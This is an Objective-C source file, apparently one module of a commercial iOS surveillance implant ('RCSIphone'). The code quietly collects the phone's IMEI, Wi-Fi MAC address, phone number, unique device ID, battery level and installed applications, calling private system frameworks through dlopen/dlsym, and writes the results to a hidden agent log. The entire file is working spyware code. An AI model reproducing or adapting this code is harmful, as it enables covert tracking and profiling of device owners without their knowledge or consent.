//
//  RCSIAgentDevice.m
//  RCSIphone
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 HT srl. All rights reserved.
//
#import <dlfcn.h>

#import "RCSIAgentDevice.h"
#import "RCSICommon.h"
#import "RCSIUtils.h"

//#define DEBUG_DEVICE

NSString *kSPHardwareDataType     = @"SPHardwareDataType";
NSString *kSPApplicationsDataType = @"SPApplicationsDataType";
NSString *kAppName = @"kAppName";
#define NL_NL @"\n\t\t"
#define APPLICATIONS_PATH @"/Applications"
#define USER_APPLICATIONS_PATH @"/private/var/mobile/Applications"

#define DEVICE_STRING_FMT        @"\nDevice info:\n"      \
                                  "Name:\t\t%@\n"         \
                                  "Model:\t\t%@\n"        \
                                  "System:\t\t%@\n"       \
                                  "Version:\t\t%@\n"      \
                                  "UniqID:\t\t%@\n"       \
                                  "Battery:\t\t%f\n"      \
                                  "Wifi-address:\t\t%@\n" \
                                  "IMEI:\t\t%@\n"        \
                                  "Phone num.:\t\t%@"

#define DEVICE_STRING_APPS_FMT   @"\nDevice info:\n"      \
                                  "Name:\t\t%@\n"         \
                                  "Model:\t\t%@\n"        \
                                  "System:\t\t%@\n"       \
                                  "Version:\t\t%@\n"      \
                                  "UniqID:\t\t%@\n"       \
                                  "Battery:\t\t%f\n"      \
                                  "Wifi-address:\t\t%@\n" \
                                  "IMEI:\t\t%@\n"         \
                                  "Phone num.:\t\t%@"     \
                                  "%@"

void callback() { };

@implementation _i_AgentDevice

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)initWithConfigData:(NSData *)aData
{
  self = [super initWithConfigData: aData];
  
  memcpy(&mAppList,[mAgentConfiguration bytes], sizeof(mAppList));
  
  if (self != nil)
    mAgentID = AGENT_DEVICE;
  
  return self;
}

#pragma mark -
#pragma mark Applications routine
#pragma mark -

- (NSMutableArray*)getAppsNames:(NSArray*)appsPathArray
{
  NSRange subrange;
  subrange.location = 0;
  
  NSMutableArray *appArray = [NSMutableArray arrayWithCapacity:0];
  
  if (appsPathArray == nil || [self isThreadCancelled] == TRUE)
    return appArray;
  
  for (int j=0; j < [appsPathArray count]; j++)
    {
      NSString *tmpAppPath = [appsPathArray objectAtIndex:j];
    
      NSRange tmpRange = [tmpAppPath rangeOfString: @".app"];
    
      if (tmpRange.location == NSNotFound)
        continue;
      else
        {
          subrange.length = tmpRange.location;
          [appArray addObject:[tmpAppPath substringWithRange: subrange]];
        }
    }
  
  return appArray;
}


- (NSMutableArray*)getAppsNameFromAppFolders
{
  NSRange subrange;
  subrange.location = 0;
  
  NSMutableArray *appArray = [NSMutableArray arrayWithCapacity:0];
  
  if ([self isThreadCancelled] == TRUE)
    return appArray;
  
  NSFileManager *dflFileMgr = [NSFileManager defaultManager];
  
  NSError *err;
  
  NSArray *appFirstLevelPath = [dflFileMgr contentsOfDirectoryAtPath: APPLICATIONS_PATH 
                                                               error: &err];
  if (appFirstLevelPath == nil)
    return  appArray;
  
  NSMutableArray *theAppArray = [self getAppsNames: appFirstLevelPath];
  
  [appArray addObjectsFromArray: theAppArray];
  
  NSArray *usrAppFirstLevelPath = [dflFileMgr contentsOfDirectoryAtPath: USER_APPLICATIONS_PATH 
                                                                  error: &err];
  
  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
    return  appArray;
  
  for (int i=0; i < [usrAppFirstLevelPath count]; i++) 
    {
      NSString *tmpPath = [NSString stringWithFormat: @"%@/%@", USER_APPLICATIONS_PATH,
                                                                [usrAppFirstLevelPath objectAtIndex:i]];
      
      NSArray *appSecondLevelPath = [dflFileMgr contentsOfDirectoryAtPath: tmpPath 
                                                                    error: &err];
    
      if (appSecondLevelPath == nil)
        continue;
      
      NSMutableArray *theUserAppArray = [self getAppsNames: appSecondLevelPath];
    
      [appArray addObjectsFromArray: theUserAppArray];   
    }
  
  return appArray;
}

- (NSMutableString*)getInstalledApp
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if ([self isThreadCancelled] == TRUE)
    { 
      [pool release];
      return nil;
    }
    
  NSMutableArray *appPathNames = [self getAppsNameFromAppFolders];
  
  NSMutableString *apps = [[NSMutableString alloc] initWithCapacity:0];
  
  [apps appendString: @"\n\n Installed applications:\n"];
  [apps appendString: NL_NL];
  
  for (int i=0; i < [appPathNames count]; i++) 
    {
      if ([self isThreadCancelled] == TRUE)
        { 
          [pool release];
          return apps;
        }
    
      id appPath = [appPathNames objectAtIndex:i];
      [apps appendString: appPath];
      [apps appendString: NL_NL];
    }
  
  [pool release];
  
  return apps;
}

#pragma mark -
#pragma mark Device logging
#pragma mark -

- (BOOL)writeDeviceInfo: (NSData*)aInfo
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  NSString *tmpUTF16Info = nil;
  
  if (aInfo == nil)
  {
    [pool release];
    return NO;
  }
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOGTYPE_DEVICE
                           agentHeader: nil
                             withLogID: 0];
  
  if (success == TRUE)
  {

    tmpUTF16Info = [[NSString alloc]initWithData: aInfo
                                        encoding: NSUTF16LittleEndianStringEncoding];

    if (tmpUTF16Info == nil)
      tmpUTF16Info =  [[NSString alloc] initWithFormat: @"%@", @"no information"];
  
    NSMutableData *tmpData = 
    (NSMutableData*)[tmpUTF16Info dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

    [tmpUTF16Info release];
    
    if (tmpData == nil) 
    {
      NSString *nullInfo = [[NSString alloc] initWithFormat: @"%@", @"no information"];
      tmpData = (NSMutableData*)[nullInfo dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [nullInfo release];
    }
    
    [logManager writeDataToLog: tmpData
                      forAgent: LOGTYPE_DEVICE
                     withLogID: 0];
    
    [logManager closeActiveLog: LOGTYPE_DEVICE
                     withLogID: 0];
  }
  
  [pool release];
  
  return YES;
}

#pragma mark -
#pragma mark Device info main routine
#pragma mark -

- (NSString*)getIMEI
{
  NSString *imeiStr = [[[NSString alloc] initWithFormat: @"%@", @""] autorelease];
  
  char *coreTelDlibName =
    "/System/Library/Frameworks/CoreTelephony.framework/CoreTelephony";
  
  void *handle = dlopen(coreTelDlibName, RTLD_NOW);
  
  if (handle == NULL)
    return imeiStr;
  
  CTServerConnectionCreate_t __CTServerConnectionCreate = NULL;
  CTServerConnectionCopyMobileEquipmentInfo_t __CTServerConnectionCopyMobileEquipmentInfo = NULL;
  
  __CTServerConnectionCreate= dlsym(handle, "_CTServerConnectionCreate");
  __CTServerConnectionCopyMobileEquipmentInfo = dlsym(handle, "_CTServerConnectionCopyMobileEquipmentInfo");

  
  if (__CTServerConnectionCreate == NULL ||
      __CTServerConnectionCopyMobileEquipmentInfo == NULL)
    return imeiStr;

  struct CTResult ctRes;
  
  struct CTServerConnection *sc = __CTServerConnectionCreate(kCFAllocatorDefault, callback, NULL);
  
  if (sc == NULL)
    return imeiStr;
  
  CFMutableDictionaryRef dict = NULL;
  
  __CTServerConnectionCopyMobileEquipmentInfo(&ctRes, sc, &dict);
  
  if (dict != NULL)
    imeiStr =  (NSString*)CFDictionaryGetValue(dict, CFSTR("kCTMobileEquipmentInfoIMEI"));
  
  return [imeiStr retain];
}

- (NSString*)getwifiMacAddress
{
  NSString *macStr = [[[NSString alloc] initWithFormat: @"%@", @""] autorelease];
  
  char *sysConfDlibName =
    "/System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration";
  
  void *handle = dlopen(sysConfDlibName, RTLD_NOW);
  
  if (handle == NULL)
    return macStr;
  
  SCNetworkInterfaceCopyAll_t __SCNetworkInterfaceCopyAll = NULL;
  SCNetworkInterfaceGetInterfaceType_t __SCNetworkInterfaceGetInterfaceType = NULL;
  SCNetworkInterfaceGetHardwareAddressString_t __SCNetworkInterfaceGetHardwareAddressString = NULL;
  
  __SCNetworkInterfaceCopyAll = dlsym(handle, "SCNetworkInterfaceCopyAll");
  __SCNetworkInterfaceGetInterfaceType = dlsym(handle, "SCNetworkInterfaceGetInterfaceType");
  __SCNetworkInterfaceGetHardwareAddressString = dlsym(handle, "SCNetworkInterfaceGetHardwareAddressString");
  
  if (__SCNetworkInterfaceCopyAll == NULL ||
      __SCNetworkInterfaceGetInterfaceType == NULL ||
      __SCNetworkInterfaceGetHardwareAddressString == NULL)
    return macStr;
  
  NSArray *intArray = (NSArray*) __SCNetworkInterfaceCopyAll();
  
  if (intArray == nil)
    return macStr;
  
  for (int i=0; i < [intArray count]; i++)
  {
    id intType = [intArray objectAtIndex:i];
    
    NSString *intTypeStr = __SCNetworkInterfaceGetInterfaceType(intType);
    
    if ([intTypeStr compare:@"IEEE80211"] == NSOrderedSame)
    {
      macStr = __SCNetworkInterfaceGetHardwareAddressString(intType);
      [[macStr retain] autorelease];
      break;
    }
  }
  
  [intArray release];
  
  return macStr;
}

- (NSString*)getPhoneNumber
{
  NSString *phoneStr = [[NSString alloc] initWithFormat: @"%@", @""];
  
  NSString *tmpPhoneStr = [[_i_Utils sharedInstance] getPhoneNumber];
  
  if (tmpPhoneStr != nil)
    phoneStr = [[tmpPhoneStr retain] autorelease];
  
  return phoneStr;
}

- (NSData*)getSystemInfoWithType: (NSString*)aType
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableString *apps = nil;
  NSData *retData = nil;
  NSString *systemInfoStr = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [pool release];
    return retData;
  }
  
  UIDevice *device = [UIDevice currentDevice];
  
  device.batteryMonitoringEnabled = YES;
  
  if (mAppList == TRUE)
    apps = [self getInstalledApp];
  
  NSString *wifiMac = [self getwifiMacAddress];
  NSString *imei    = [self getIMEI];
  NSString *phone   = [self getPhoneNumber];
  
  if (apps == nil)
  {
    systemInfoStr = [[NSString alloc] initWithFormat:DEVICE_STRING_FMT,
                                                     [device name],
                                                     [device model],
                                                     [device systemName],
                                                     [device systemVersion],
                                                     [device uniqueIdentifier],
                                                     [device batteryLevel],
                                                     wifiMac,
                                                     imei,
                                                     phone];
  }
  else
  {
    systemInfoStr = [[NSString alloc] initWithFormat:DEVICE_STRING_APPS_FMT,
                                                     [device name],
                                                     [device model],
                                                     [device systemName],
                                                     [device systemVersion],
                                                     [device uniqueIdentifier],
                                                     [device batteryLevel],
                                                     wifiMac,
                                                     imei,
                                                     phone,
                                                     apps];
    [apps release];
  }
  
  retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
  
  [systemInfoStr release];
  
  [pool release];
  
  return retData;
}

- (BOOL)getDeviceInfo
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if ([self isThreadCancelled] == TRUE)
    {
      [pool release];
      return FALSE;
    }
  
  NSData *infoData = [self getSystemInfoWithType: kSPHardwareDataType];
  
  if ([self isThreadCancelled] == TRUE)
    {
      [infoData release];
      [pool release];
      return FALSE;
    }
  
  if (infoData != nil)
    [self writeDeviceInfo: infoData];
  
  [infoData release];
  
  [pool release];
  
  return YES;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
  if ([self isThreadCancelled] == TRUE)
    {
      [self setMAgentStatus:AGENT_STATUS_STOPPED];
      [outerPool release];
      return;
    }

  [self getDeviceInfo];
    
  [self setMAgentStatus:AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
